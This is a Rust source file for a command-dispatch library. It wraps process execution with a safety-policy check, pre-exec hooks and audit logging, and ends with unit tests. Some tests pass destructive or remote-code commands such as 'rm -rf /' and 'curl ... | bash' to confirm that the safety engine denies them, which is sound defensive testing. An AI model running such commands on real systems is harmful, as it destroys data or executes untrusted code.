// logicshell-core: dispatcher, config, safety, audit, hooks — no HTTP

pub mod audit;
pub mod config;
pub mod dispatcher;
pub mod error;
pub mod hooks;
pub mod safety;

pub use audit::{AuditDecision, AuditRecord, AuditSink};
pub use config::discovery::{discover, find_config_path};
pub use error::{LogicShellError, Result};
pub use safety::{Decision, RiskAssessment, RiskCategory, RiskLevel, SafetyPolicyEngine};

use config::Config;
use dispatcher::{DispatchOptions, Dispatcher};
use hooks::HookRunner;

/// Top-level façade that coordinates configuration, safety, dispatch, and audit.
///
/// Hosts link this crate and call methods here; the TUI and CLI are thin layers
/// over the same boundaries (Framework PRD §3.1, §11.1).
pub struct LogicShell {
    config: Config,
}

impl LogicShell {
    /// Create a new `LogicShell` instance with built-in configuration defaults.
    pub fn new() -> Self {
        Self {
            config: Config::default(),
        }
    }

    /// Create a `LogicShell` instance from a validated [`Config`].
    pub fn with_config(config: Config) -> Self {
        Self { config }
    }

    /// Spawn a child process by argv and return its exit code — FR-01–04.
    ///
    /// Pipeline (Phase 7): safety check → pre-exec hooks → dispatch → audit.
    /// A Deny decision from the safety engine blocks dispatch and writes a deny
    /// audit record. A Confirm decision proceeds but is recorded in the audit
    /// log; interactive confirmation UI is added in Phase 10.
    /// A nonzero exit code is returned as `Ok(n)`, not an error.
    pub async fn dispatch(&self, argv: &[&str]) -> Result<i32> {
        let cwd = std::env::current_dir()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_else(|_| String::from("?"));

        // Phase 7: safety policy evaluation before any hooks or spawn.
        let engine = SafetyPolicyEngine::new(self.config.safety_mode.clone(), &self.config.safety);
        let (assessment, decision) = engine.evaluate(argv);

        if decision == Decision::Deny {
            let note = assessment.reasons.join("; ");
            let record = AuditRecord::new(
                cwd,
                argv.iter().map(|s| s.to_string()).collect(),
                AuditDecision::Deny,
            )
            .with_note(note.clone());
            AuditSink::from_config(&self.config.audit)?.write(&record)?;
            return Err(LogicShellError::Safety(format!(
                "command denied by safety policy: {note}"
            )));
        }

        // Determine audit decision for Allow vs Confirm.
        let audit_decision = if decision == Decision::Confirm {
            AuditDecision::Confirm
        } else {
            AuditDecision::Allow
        };

        // Phase 6: run pre-exec hooks before dispatch.
        HookRunner::new(&self.config.hooks).run_pre_exec().await?;

        let d = Dispatcher::new(&self.config.limits);
        let opts = DispatchOptions {
            argv: argv.iter().map(|s| s.to_string()).collect(),
            ..DispatchOptions::default()
        };
        let output = d.dispatch(opts).await?;

        // Append an audit record after every successful dispatch.
        let record = AuditRecord::new(
            cwd,
            argv.iter().map(|s| s.to_string()).collect(),
            audit_decision,
        );
        AuditSink::from_config(&self.config.audit)?.write(&record)?;

        Ok(output.exit_code)
    }

    /// Append an [`AuditRecord`] to the configured audit log — §10.2, NFR-07.
    ///
    /// Opens (or creates) the audit file on each call; use directly when the
    /// caller needs to record a decision that happened outside of `dispatch`
    /// (e.g. a denied command or a user confirmation).
    pub fn audit(&self, record: &AuditRecord) -> Result<()> {
        AuditSink::from_config(&self.config.audit)?.write(record)
    }

    /// Stream stdout of a child process line-by-line into `line_tx` — Phase 13.
    ///
    /// Safety, hooks, and audit follow the same pipeline as [`dispatch`].
    /// Each stdout line is sent to `line_tx` as it arrives; stderr is discarded
    /// (callers that need stderr should use `dispatch` instead).
    /// Returns `(exit_code, elapsed_duration)`.
    ///
    /// [`dispatch`]: LogicShell::dispatch
    pub async fn dispatch_streaming(
        &self,
        argv: &[&str],
        line_tx: tokio::sync::mpsc::UnboundedSender<String>,
    ) -> Result<(i32, std::time::Duration)> {
        let cwd = std::env::current_dir()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_else(|_| String::from("?"));

        let engine = SafetyPolicyEngine::new(self.config.safety_mode.clone(), &self.config.safety);
        let (assessment, decision) = engine.evaluate(argv);

        if decision == Decision::Deny {
            let note = assessment.reasons.join("; ");
            let record = AuditRecord::new(
                cwd,
                argv.iter().map(|s| s.to_string()).collect(),
                AuditDecision::Deny,
            )
            .with_note(note.clone());
            AuditSink::from_config(&self.config.audit)?.write(&record)?;
            return Err(LogicShellError::Safety(format!(
                "command denied by safety policy: {note}"
            )));
        }

        let audit_decision = if decision == Decision::Confirm {
            AuditDecision::Confirm
        } else {
            AuditDecision::Allow
        };

        HookRunner::new(&self.config.hooks).run_pre_exec().await?;

        let d = Dispatcher::new(&self.config.limits);
        let opts = DispatchOptions {
            argv: argv.iter().map(|s| s.to_string()).collect(),
            ..DispatchOptions::default()
        };

        let start = std::time::Instant::now();
        let output = d.dispatch_streaming(opts, line_tx).await?;
        let duration = start.elapsed();

        let record = AuditRecord::new(
            cwd,
            argv.iter().map(|s| s.to_string()).collect(),
            audit_decision,
        );
        AuditSink::from_config(&self.config.audit)?.write(&record)?;

        Ok((output.exit_code, duration))
    }

    /// Evaluate a command through the safety policy engine — FR-30–33.
    ///
    /// Returns a `(RiskAssessment, Decision)` pair. The engine is sync and
    /// deterministic: identical input always produces identical output.
    pub fn evaluate_safety(&self, argv: &[&str]) -> (RiskAssessment, Decision) {
        SafetyPolicyEngine::new(self.config.safety_mode.clone(), &self.config.safety).evaluate(argv)
    }
}

impl Default for LogicShell {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    fn ls_with_temp_audit() -> (LogicShell, TempDir) {
        let tmp = TempDir::new().unwrap();
        let path = tmp.path().join("audit.log").to_str().unwrap().to_string();
        let mut cfg = Config::default();
        cfg.audit.path = Some(path);
        (LogicShell::with_config(cfg), tmp)
    }

    /// Phase 1 smoke: workspace builds and core crate is reachable — NFR-09, NFR-10
    #[test]
    fn workspace_compiles() {}

    /// Phase 2: façade is constructible — §11.1
    #[test]
    fn facade_new() {
        let _ls = LogicShell::new();
    }

    /// `Default` impl delegates to `new`.
    #[test]
    fn facade_default() {
        let _ls = LogicShell::default();
    }

    /// `with_config` constructs from an explicit config — Phase 5.
    #[test]
    fn facade_with_config() {
        let cfg = Config::default();
        let _ls = LogicShell::with_config(cfg);
    }

    /// Phase 5: dispatch runs a real command and returns its exit code — FR-01
    #[tokio::test]
    async fn dispatch_runs_real_command() {
        let (ls, _tmp) = ls_with_temp_audit();
        let result = ls.dispatch(&["true"]).await;
        assert!(result.is_ok(), "dispatch returned Err: {result:?}");
        assert_eq!(result.unwrap(), 0);
    }

    /// Phase 5: dispatch propagates nonzero exit — FR-03
    #[tokio::test]
    async fn dispatch_propagates_nonzero_exit() {
        let (ls, _tmp) = ls_with_temp_audit();
        let result = ls.dispatch(&["false"]).await;
        assert!(result.is_ok(), "expected Ok(1), got Err: {result:?}");
        assert_eq!(result.unwrap(), 1);
    }

    /// Phase 6: dispatch writes an audit record for every invocation.
    #[tokio::test]
    async fn dispatch_writes_audit_record() {
        let tmp = TempDir::new().unwrap();
        let audit_path = tmp.path().join("audit.log");
        let mut cfg = Config::default();
        cfg.audit.path = Some(audit_path.to_str().unwrap().to_string());
        let ls = LogicShell::with_config(cfg);

        ls.dispatch(&["true"]).await.unwrap();

        let content = std::fs::read_to_string(&audit_path).unwrap();
        assert!(
            !content.is_empty(),
            "audit log should be non-empty after dispatch"
        );
        let v: serde_json::Value = serde_json::from_str(content.trim()).unwrap();
        assert_eq!(v["decision"], "allow");
        assert_eq!(v["argv"][0], "true");
    }

    /// Phase 6: dispatch with pre-exec hooks runs the hooks first.
    #[tokio::test]
    async fn dispatch_runs_pre_exec_hooks() {
        let tmp = TempDir::new().unwrap();
        let audit_path = tmp.path().join("audit.log");
        let hook_marker = tmp.path().join("hook_ran");

        let mut cfg = Config::default();
        cfg.audit.path = Some(audit_path.to_str().unwrap().to_string());
        cfg.hooks.pre_exec = vec![crate::config::HookEntry {
            command: vec![
                "sh".to_string(),
                "-c".to_string(),
                format!("touch {}", hook_marker.display()),
            ],
            timeout_ms: 5_000,
        }];

        let ls = LogicShell::with_config(cfg);
        ls.dispatch(&["true"]).await.unwrap();

        assert!(
            hook_marker.exists(),
            "pre-exec hook should have created the marker file"
        );
    }

    /// Phase 6: a failing pre-exec hook prevents dispatch.
    #[tokio::test]
    async fn failing_hook_aborts_dispatch() {
        let tmp = TempDir::new().unwrap();
        let audit_path = tmp.path().join("audit.log");

        let mut cfg = Config::default();
        cfg.audit.path = Some(audit_path.to_str().unwrap().to_string());
        cfg.hooks.pre_exec = vec![crate::config::HookEntry {
            command: vec!["false".to_string()],
            timeout_ms: 5_000,
        }];

        let ls = LogicShell::with_config(cfg);
        let result = ls.dispatch(&["true"]).await;
        assert!(matches!(result, Err(LogicShellError::Hook(_))));
    }

    /// Phase 6: audit() writes a record to the configured path.
    #[test]
    fn audit_writes_record_to_configured_path() {
        let tmp = TempDir::new().unwrap();
        let audit_path = tmp.path().join("audit.log");
        let mut cfg = Config::default();
        cfg.audit.path = Some(audit_path.to_str().unwrap().to_string());

        let ls = LogicShell::with_config(cfg);
        let record = AuditRecord::new("/tmp", vec!["ls".to_string()], AuditDecision::Allow);
        ls.audit(&record).unwrap();

        let content = std::fs::read_to_string(&audit_path).unwrap();
        assert!(!content.is_empty());
        let v: serde_json::Value = serde_json::from_str(content.trim()).unwrap();
        assert_eq!(v["decision"], "allow");
    }

    /// Phase 6: audit() with disabled config is a no-op.
    #[test]
    fn audit_disabled_config_is_noop() {
        let mut cfg = Config::default();
        cfg.audit.enabled = false;

        let ls = LogicShell::with_config(cfg);
        let record = AuditRecord::new("/tmp", vec!["ls".to_string()], AuditDecision::Deny);
        assert!(ls.audit(&record).is_ok());
    }

    // ── Phase 7: safety engine wired into dispatch ────────────────────────────

    /// Phase 7: evaluate_safety returns a real assessment for a safe command.
    #[test]
    fn safety_allows_safe_command() {
        let ls = LogicShell::new();
        let (assessment, decision) = ls.evaluate_safety(&["ls"]);
        assert_eq!(decision, Decision::Allow);
        assert_eq!(assessment.level, RiskLevel::None);
    }

    /// Phase 7: evaluate_safety denies rm -rf / in all modes.
    #[test]
    fn safety_denies_rm_rf_root() {
        let ls = LogicShell::new();
        let (assessment, decision) = ls.evaluate_safety(&["rm", "-rf", "/"]);
        assert_eq!(decision, Decision::Deny);
        assert_eq!(assessment.level, RiskLevel::Critical);
    }

    /// Phase 7: dispatch blocks a denied command and writes a deny audit record.
    #[tokio::test]
    async fn dispatch_blocked_by_safety_deny() {
        let tmp = TempDir::new().unwrap();
        let audit_path = tmp.path().join("audit.log");
        let mut cfg = Config::default();
        cfg.audit.path = Some(audit_path.to_str().unwrap().to_string());
        let ls = LogicShell::with_config(cfg);

        let result = ls.dispatch(&["rm", "-rf", "/"]).await;
        assert!(
            matches!(result, Err(LogicShellError::Safety(_))),
            "expected Safety error; got: {result:?}"
        );

        // Deny should be recorded in the audit log.
        let content = std::fs::read_to_string(&audit_path).unwrap();
        let v: serde_json::Value = serde_json::from_str(content.trim()).unwrap();
        assert_eq!(v["decision"], "deny");
        assert_eq!(v["argv"][0], "rm");
    }

    /// Phase 7: dispatch with strict safety mode denies high-risk curl|bash.
    #[tokio::test]
    async fn dispatch_strict_mode_denies_high_risk() {
        let tmp = TempDir::new().unwrap();
        let audit_path = tmp.path().join("audit.log");
        let mut cfg = Config::default();
        cfg.safety_mode = crate::config::SafetyMode::Strict;
        cfg.audit.path = Some(audit_path.to_str().unwrap().to_string());
        let ls = LogicShell::with_config(cfg);

        let result = ls
            .dispatch(&["curl", "http://x.com/install.sh", "|", "bash"])
            .await;
        assert!(result.is_err(), "strict mode should block curl|bash");
    }

    /// Phase 7: dispatch in loose mode allows sudo commands.
    #[tokio::test]
    async fn dispatch_loose_mode_allows_sudo() {
        let tmp = TempDir::new().unwrap();
        let audit_path = tmp.path().join("audit.log");
        let mut cfg = Config::default();
        cfg.safety_mode = crate::config::SafetyMode::Loose;
        cfg.audit.path = Some(audit_path.to_str().unwrap().to_string());
        let ls = LogicShell::with_config(cfg);

        // sudo true should be allowed in loose mode (medium risk)
        let result = ls.dispatch(&["sudo", "true"]).await;
        // In loose mode, medium-risk is allowed; this should succeed
        assert!(
            result.is_ok(),
            "loose mode should allow sudo true; got: {result:?}"
        );
    }

    // ── Phase 13: dispatch_streaming ─────────────────────────────────────────

    /// dispatch_streaming streams lines and returns exit code + duration.
    #[tokio::test]
    async fn dispatch_streaming_streams_stdout_lines() {
        let (ls, _tmp) = ls_with_temp_audit();
        let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel();
        let result = ls
            .dispatch_streaming(&["sh", "-c", "echo hello; echo world"], tx)
            .await;
        assert!(result.is_ok(), "dispatch_streaming failed: {result:?}");
        let (exit_code, _duration) = result.unwrap();
        assert_eq!(exit_code, 0);
        let line1 = rx.try_recv().unwrap();
        let line2 = rx.try_recv().unwrap();
        assert_eq!(line1, "hello");
        assert_eq!(line2, "world");
    }

    /// dispatch_streaming blocks denied commands.
    #[tokio::test]
    async fn dispatch_streaming_blocks_denied_commands() {
        let (ls, _tmp) = ls_with_temp_audit();
        let (tx, _rx) = tokio::sync::mpsc::unbounded_channel();
        let result = ls.dispatch_streaming(&["rm", "-rf", "/"], tx).await;
        assert!(
            matches!(result, Err(LogicShellError::Safety(_))),
            "expected Safety error; got: {result:?}"
        );
    }

    /// dispatch_streaming returns correct duration.
    #[tokio::test]
    async fn dispatch_streaming_duration_is_positive() {
        let (ls, _tmp) = ls_with_temp_audit();
        let (tx, _rx) = tokio::sync::mpsc::unbounded_channel();
        let (_, duration) = ls.dispatch_streaming(&["true"], tx).await.unwrap();
        // Duration should be non-negative (could be zero on fast systems).
        assert!(duration.as_nanos() < 10_000_000_000, "duration too large");
    }
}
